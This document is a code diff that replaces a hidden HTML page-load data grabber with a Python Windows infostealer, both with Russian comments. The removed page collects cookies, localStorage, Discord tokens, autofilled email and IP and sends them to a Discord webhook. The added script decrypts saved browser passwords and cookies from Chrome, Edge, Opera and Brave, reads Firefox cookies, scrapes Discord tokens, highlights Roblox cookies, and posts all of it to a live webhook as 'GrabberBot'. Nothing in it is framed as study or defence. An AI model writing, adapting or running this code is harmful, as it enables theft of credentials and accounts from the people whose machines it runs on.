@@ -1,134 +1,267 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-</head>
-<body style="display:none;">
-<!-- НЕВИДИМАЯ ФОРМА ДЛЯ АВТОЗАПОЛНЕНИЯ EMAIL -->
-<form id="hiddenForm" style="position:absolute;left:-9999px;top:-9999px;">
-  <input type="email" id="emailInput" name="email" autocomplete="email">
-  <input type="submit" style="display:none;">
-</form>
+import os
+import sys
+import json
+import sqlite3
+import base64
+import shutil
+import requests
+import win32crypt
+from Crypto.Cipher import AES
+from typing import Dict, List, Optional, Any
+import subprocess
+import platform
+import re
 
-<script>
-(function() {
-    // КОНФИГУРАЦИЯ: ВСТРОЕННЫЙ WEBHOOK
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1531307495568703582/opho_dIy0SSN4wyspTeQtpWFDLw1bdD3apjaxQLfY_penTBC_gm-t6VOXfpP6PsmlbYA";
+# ========== КОНФИГУРАЦИЯ ==========
+WEBHOOK_URL = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP"
 
-    // ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
-    function sendData(data) {
-        const payload = {
-            content: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-            username: "GrabberBot"
-        };
-        fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-            mode: "cors"
-        }).catch(e => console.error(e));
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
+def get_master_key(browser_path: str) -> Optional[bytes]:
+    local_state = os.path.join(os.path.dirname(os.path.dirname(browser_path)), "Local State")
+    if not os.path.isfile(local_state):
+        return None
+    with open(local_state, "r", encoding="utf-8") as f:
+        data = json.load(f)
+    encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_token(encrypted: bytes, master_key: bytes) -> str:
+    nonce = encrypted[3:15]
+    ciphertext = encrypted[15:-16]
+    tag = encrypted[-16:]
+    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+    dec = cipher.decrypt_and_verify(ciphertext, tag)
+    return dec.decode('utf-8')
+
+def decrypt_password(encrypted: bytes, master_key: bytes) -> str:
+    try:
+        nonce = encrypted[3:15]
+        ciphertext = encrypted[15:-16]
+        tag = encrypted[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+    except:
+        return ""
+
+def get_ip() -> str:
+    try:
+        return requests.get("https://api.ipify.org?format=json", timeout=5).json()["ip"]
+    except:
+        return "IP не получен"
+
+def get_email_from_storage(storage_dict: Dict) -> Optional[str]:
+    keys = ["email", "user_email", "mail", "login", "username", "profile_email"]
+    for k in keys:
+        if k in storage_dict and "@" in str(storage_dict[k]):
+            return storage_dict[k]
+    return None
+
+BROWSERS = {
+    "Chrome": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
+    "Edge": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
+    "Opera": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable"),
+    "Brave": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
+    "Firefox": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles")
+}
+
+def extract_chromium_data(browser_name: str, user_data_path: str) -> Dict:
+    result = {"passwords": [], "cookies": [], "tokens": [], "discord_tokens": []}
+    master_key = get_master_key(user_data_path)
+    if not master_key:
+        return result
+
+    login_db = os.path.join(user_data_path, "Default", "Login Data")
+    if os.path.isfile(login_db):
+        temp_db = os.path.join(os.environ["TEMP"], "login_copy.db")
+        shutil.copyfile(login_db, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            url, username, enc_pass = row
+            if enc_pass:
+                try:
+                    dec = decrypt_password(enc_pass, master_key)
+                    if dec:
+                        result["passwords"].append({"url": url, "username": username, "password": dec})
+                except:
+                    pass
+        conn.close()
+        os.remove(temp_db)
+
+    cookies_db = os.path.join(user_data_path, "Default", "Network", "Cookies")
+    if os.path.isfile(cookies_db):
+        temp_db = os.path.join(os.environ["TEMP"], "cookies_copy.db")
+        shutil.copyfile(cookies_db, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            host, name, enc_val = row
+            if enc_val:
+                try:
+                    dec = decrypt_password(enc_val, master_key)
+                    if dec:
+                        result["cookies"].append({"host": host, "name": name, "value": dec})
+                except:
+                    pass
+        conn.close()
+        os.remove(temp_db)
+
+    leveldb_path = os.path.join(user_data_path, "Default", "Local Storage", "leveldb")
+    if os.path.isdir(leveldb_path):
+        temp_dir = os.path.join(os.environ["TEMP"], "leveldb_copy")
+        shutil.copytree(leveldb_path, temp_dir, dirs_exist_ok=True)
+        token_pattern = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
+        for file in os.listdir(temp_dir):
+            if file.endswith(".ldb") or file.endswith(".log"):
+                try:
+                    with open(os.path.join(temp_dir, file), "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                        matches = token_pattern.findall(content)
+                        result["tokens"].extend(matches)
+                except:
+                    pass
+        shutil.rmtree(temp_dir, ignore_errors=True)
+    return result
+
+def extract_firefox_data(profiles_path: str) -> Dict:
+    result = {"passwords": [], "cookies": [], "tokens": []}
+    if not os.path.isdir(profiles_path):
+        return result
+    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
+    for profile in profiles:
+        profile_dir = os.path.join(profiles_path, profile)
+        logins_file = os.path.join(profile_dir, "logins.json")
+        if os.path.isfile(logins_file):
+            try:
+                with open(logins_file, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                for login in data.get("logins", []):
+                    result["passwords"].append({"url": login.get("hostname", ""), "username": "зашифровано", "password": "зашифровано"})
+            except:
+                pass
+        cookies_db = os.path.join(profile_dir, "cookies.sqlite")
+        if os.path.isfile(cookies_db):
+            try:
+                temp_db = os.path.join(os.environ["TEMP"], "ff_cookies_copy.db")
+                shutil.copyfile(cookies_db, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host, name, value FROM moz_cookies")
+                for row in cursor.fetchall():
+                    result["cookies"].append({"host": row[0], "name": row[1], "value": row[2]})
+                conn.close()
+                os.remove(temp_db)
+            except:
+                pass
+    return result
+
+def get_system_info() -> Dict:
+    return {
+        "os": platform.system() + " " + platform.release(),
+        "hostname": platform.node(),
+        "username": os.getenv("USERNAME") or os.getenv("USER"),
+        "arch": platform.machine()
     }
 
-    // 1. ПОЛУЧЕНИЕ IP
-    function getIP(callback) {
-        fetch("https://api.ipify.org?format=json")
-            .then(r => r.json())
-            .then(data => callback(data.ip))
-            .catch(() => callback("IP не получен"));
+def main():
+    data = {
+        "ip": get_ip(),
+        "system": get_system_info(),
+        "email": None,
+        "discord_tokens": [],
+        "browsers": {}
     }
 
-    // 2. ПОЛУЧЕНИЕ ТОКЕНА DISCORD ИЗ LOCALSTORAGE
-    function getDiscordToken() {
-        try {
-            return localStorage.getItem("token") || null;
-        } catch(e) { return null; }
+    all_cookies = []
+    all_passwords = []
+    all_tokens = []
+
+    for name, path in BROWSERS.items():
+        if name == "Firefox":
+            ff_data = extract_firefox_data(path)
+            all_passwords.extend(ff_data["passwords"])
+            all_cookies.extend(ff_data["cookies"])
+            continue
+        if not os.path.isdir(path):
+            continue
+        browser_data = extract_chromium_data(name, path)
+        all_passwords.extend(browser_data["passwords"])
+        all_cookies.extend(browser_data["cookies"])
+        all_tokens.extend(browser_data["tokens"])
+        if browser_data.get("discord_tokens"):
+            data["discord_tokens"].extend(browser_data["discord_tokens"])
+
+    token_pattern = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
+    unique_tokens = list(set([t for t in all_tokens if token_pattern.match(t)]))
+    data["discord_tokens"] = unique_tokens
+
+    for cookie in all_cookies:
+        if "email" in cookie["name"].lower() and "@" in cookie["value"]:
+            data["email"] = cookie["value"]
+            break
+    if not data["email"]:
+        for pwd in all_passwords:
+            if "@" in pwd.get("username", ""):
+                data["email"] = pwd["username"]
+                break
+
+    data["passwords"] = all_passwords
+    data["cookies"] = all_cookies
+
+    emojis = {
+        "ip": "🌐",
+        "system": "💻",
+        "email": "📧",
+        "discord_tokens": "🎫",
+        "passwords": "🔑",
+        "cookies": "🍪"
     }
 
-    // 3. ПОЛУЧЕНИЕ ВСЕХ ДАННЫХ LOCALSTORAGE (ПАРЫ КЛЮЧ-ЗНАЧЕНИЕ)
-    function getAllLocalStorage() {
-        try {
-            const obj = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                obj[key] = localStorage.getItem(key);
-            }
-            return obj;
-        } catch(e) { return {}; }
+    content_lines = []
+    content_lines.append(f"{emojis['ip']} **IP:** {data['ip']}")
+    content_lines.append(f"{emojis['system']} **System:** {data['system']['os']} | {data['system']['hostname']} | {data['system']['username']}")
+    if data['email']:
+        content_lines.append(f"{emojis['email']} **Email:** {data['email']}")
+    else:
+        content_lines.append(f"{emojis['email']} **Email:** не найден")
+
+    if data['discord_tokens']:
+        content_lines.append(f"{emojis['discord_tokens']} **Discord Tokens ({len(data['discord_tokens'])}):**")
+        for tok in data['discord_tokens']:
+            content_lines.append(f"`{tok}`")
+    else:
+        content_lines.append(f"{emojis['discord_tokens']} **Discord Tokens:** не найдены")
+
+    if data['passwords']:
+        content_lines.append(f"{emojis['passwords']} **Passwords ({len(data['passwords'])}):**")
+        for p in data['passwords'][:20]:
+            content_lines.append(f"`{p['url']}` | `{p['username']}` | `{p['password']}`")
+    else:
+        content_lines.append(f"{emojis['passwords']} **Passwords:** не найдены")
+
+    if data['cookies']:
+        roblox_cookies = [c for c in data['cookies'] if 'roblox' in c['host'].lower()]
+        content_lines.append(f"{emojis['cookies']} **Cookies (всего {len(data['cookies'])}):**")
+        if roblox_cookies:
+            content_lines.append(f"  🎮 Roblox cookies ({len(roblox_cookies)}):")
+            for c in roblox_cookies[:10]:
+                content_lines.append(f"    `{c['name']}={c['value']}`")
+        for c in data['cookies'][:10]:
+            content_lines.append(f"  `{c['host']}` | `{c['name']}` | `{c['value']}`")
+    else:
+        content_lines.append(f"{emojis['cookies']} **Cookies:** не найдены")
+
+    payload = {
+        "content": "\n".join(content_lines),
+        "username": "GrabberBot"
     }
+    try:
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
+    except:
+        pass
 
-    // 4. ПОЛУЧЕНИЕ ВСЕХ COOKIE
-    function getAllCookies() {
-        try {
-            return document.cookie.split("; ").reduce((acc, cur) => {
-                const [k, v] = cur.split("=");
-                acc[k] = v;
-                return acc;
-            }, {});
-        } catch(e) { return {}; }
-    }
-
-    // 5. ПОИСК EMAIL В LOCALSTORAGE И COOKIE ПО КЛЮЧАМ
-    function findEmailInStorage(storage) {
-        const possibleKeys = ["email", "user_email", "mail", "login", "username", "profile_email"];
-        for (const key of possibleKeys) {
-            if (storage[key] && storage[key].includes("@")) {
-                return storage[key];
-            }
-        }
-        return null;
-    }
-
-    // 6. ПОПЫТКА ПОЛУЧИТЬ EMAIL ИЗ АВТОЗАПОЛНЕНИЯ (ЧЕРЕЗ СКРЫТУЮ ФОРМУ)
-    function getEmailFromAutofill(callback) {
-        const input = document.getElementById("emailInput");
-        if (!input) return callback(null);
-        input.focus();
-        setTimeout(() => {
-            const val = input.value;
-            if (val && val.includes("@")) {
-                callback(val);
-            } else {
-                callback(null);
-            }
-        }, 300);
-    }
-
-    // 7. СБОР ВСЕХ ДАННЫХ И ОТПРАВКА
-    function collectAndSend() {
-        const lsData = getAllLocalStorage();
-        const cookies = getAllCookies();
-        const token = getDiscordToken();
-        const emailFromStorage = findEmailInStorage(lsData) || findEmailInStorage(cookies);
-
-        getIP(function(ip) {
-            getEmailFromAutofill(function(autoEmail) {
-                const finalEmail = autoEmail || emailFromStorage || null;
-
-                const result = {
-                    timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent,
-                    ip: ip,
-                    discord_token: token,
-                    email: finalEmail,
-                    localStorage: lsData,
-                    cookies: cookies,
-                    url: window.location.href,
-                    referrer: document.referrer || null,
-                    screen: `${screen.width}x${screen.height}`,
-                    language: navigator.language
-                };
-
-                sendData(result);
-            });
-        });
-    }
-
-    window.onload = function() {
-        setTimeout(collectAndSend, 500);
-    };
-})();
-</script>
-</body>
-</html>
+if __name__ == "__main__":
+    main()
